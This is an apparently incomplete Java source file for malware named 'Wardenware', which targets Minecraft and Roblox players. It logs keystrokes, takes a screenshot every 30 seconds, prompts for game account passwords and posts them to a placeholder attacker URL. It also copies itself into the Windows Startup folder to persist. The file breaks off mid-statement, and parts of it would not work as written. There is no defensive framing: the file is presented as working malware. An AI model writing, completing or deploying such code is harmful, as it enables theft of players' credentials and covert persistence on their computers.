import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import java.util.*;
import javax.imageio.ImageIO;
import javax.swing.*;

public class Wardenware {
    private static String keylog = "";
    private static String username;
    private static String password;
    private static final String UPLOAD_URL = "https://hackerwebsite.com/upload.php";
    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36";

    public static void main(String[] args) throws Exception {
        // Keylogger
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
            @Override
            public boolean dispatchKeyEvent(KeyEvent ke) {
                if (ke.getID() == KeyEvent.KEY_RELEASED) {
                    String key = KeyEvent.getKeyText(ke.getKeyCode());
                    if (key.length() > 1) {
                        key = "<" + key + ">";
                    }
                    keylog += key;
                }
                return false;
            }
        });

        // Screenshot capture
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                try {
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    BufferedImage capture = new Robot().createScreenCapture(screenRect);
                    ImageIO.write(capture, "png", new File("screenshot.png"));
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }, 0, 30000);

        // Stealing Minecraft and Roblox credentials
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter your Minecraft or Roblox username: ");
        username = scanner.nextLine();
        System.out.print("Enter your Minecraft or Roblox password: ");
        password = scanner.nextLine();

        Map<String, String> parameters = new HashMap<>();
        parameters.put("username", username);
        parameters.put("password", password);
        post(UPLOAD_URL, parameters);

        // Self-replication
        String file = new File(Wardenware.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getPath();
        Runtime.getRuntime().exec("cmd /c copy " + file + " %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");

        // Slowing down computer
        while (true) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private static void post(String url, Map<String, String> parameters) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(getParamsString(parameters));
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("\nSending 'POST' request to URL : " + url);
        System.out.println("Post parameters : " + parameters);
        System.out.println("Response Code : " + responseCode);
        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response
